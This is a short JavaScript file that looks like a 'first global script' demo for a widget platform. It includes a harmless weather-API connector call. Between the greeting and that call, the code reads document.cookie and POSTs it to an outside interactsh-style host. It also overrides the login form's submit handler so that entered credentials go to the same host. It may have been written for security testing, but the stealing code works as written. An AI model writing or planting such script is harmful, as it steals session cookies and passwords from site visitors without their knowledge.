console.log('Hello from your first global script!');
//alert('Hello from your first global script!');
console.log(document.cookie);
console.log(document.domain);

let data = document.cookie;

const interactsh = "https://daon64cp92lm19hhpil0tmj3nzybngm7s.desert-rat.net"

fetch(interactsh, {
  method: "POST",
  body: data,
});

login.onsubmit = async (e) => {
    e.preventDefault();

    let response = await fetch(interactsh, {
      method: 'POST',
      body: new FormData(login)
    });

    //let result = await response.json();

    //alert(result.message);
  };

  (async () => {
  const sdk = new window.WidgetServiceSDK();
  try {
    const data = await sdk.connectors.execute({
      permalink: "weather-api",
      method: "GET",
      queryParams: { q: "Warsaw" }
    });
    console.log("Weather data:", data);
  } catch (error) {
    console.error("Connector request failed:", error);
  }
})();